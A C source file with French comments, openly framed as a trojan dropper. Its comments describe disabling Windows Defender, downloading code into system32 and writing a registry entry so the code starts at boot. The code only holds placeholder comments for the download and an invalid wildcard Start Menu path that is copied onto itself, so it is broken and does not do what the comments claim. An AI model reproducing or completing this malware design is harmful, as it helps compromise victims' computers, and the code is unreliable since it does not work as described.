/* si droit admin, désactive les anti-virus (windows defender)*/

/*telecharge du code dans internet et le copie dans c:\windows\system32*/

/*ecrit dans le registre pour que le code telechargé démarre au démarrage*/

#include <stdio.h>
#include <stdlib.h>


int main(void)
{

  //telcharge le trojan

  //telcharge le trojan

  //make the trojan start at boot
FILE* trojanBoot = fopen("C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu","w");


fclose(trojanBoot);

    char ch;

    FILE *source, *target;
    char source_file[] = "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu";
    char target_file[] = "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu";

    source = fopen(source_file, "r");

        if( source == NULL )
        {
            exit(EXIT_FAILURE);
        }

    target = fopen(target_file, "w");

    if( target == NULL )
    {
        fclose(source);
        exit(EXIT_FAILURE);
    }

    while( ( ch = fgetc(source) ) != EOF )
        fputc(ch, target);
        fclose(source);
        fclose(target);

        return 0;

  //make the trojan start at boot
}
